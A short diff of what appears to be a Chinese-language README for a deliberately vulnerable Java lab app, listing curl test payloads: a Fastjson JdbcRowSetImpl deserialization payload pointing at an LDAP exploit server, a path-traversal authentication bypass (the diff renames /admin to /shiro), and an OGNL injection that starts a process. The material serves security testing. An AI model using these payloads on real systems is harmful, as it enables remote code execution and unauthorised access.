@@ -7,8 +7,8 @@
    curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
    ```
 3. 测试 alwaysUseFullPath 认证绕过漏洞: http://rui0.cn/archives/1643
-   * 直接访问 /admin/auth 会提示认证失败
-   * 使用 /admin/no-auth/%2e%2e/auth 可以绕过认证
+   * 直接访问 /shiro/auth 会提示认证失败
+   * 使用 /shiro/no-auth/%2e%2e/auth 可以绕过认证
 4. 测试ognl执行
    ```
    curl 127.0.0.1:8080/ognl/parse -d 'ognl=#a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"open", "/System/Applications/Calculator.app/"})).start()'
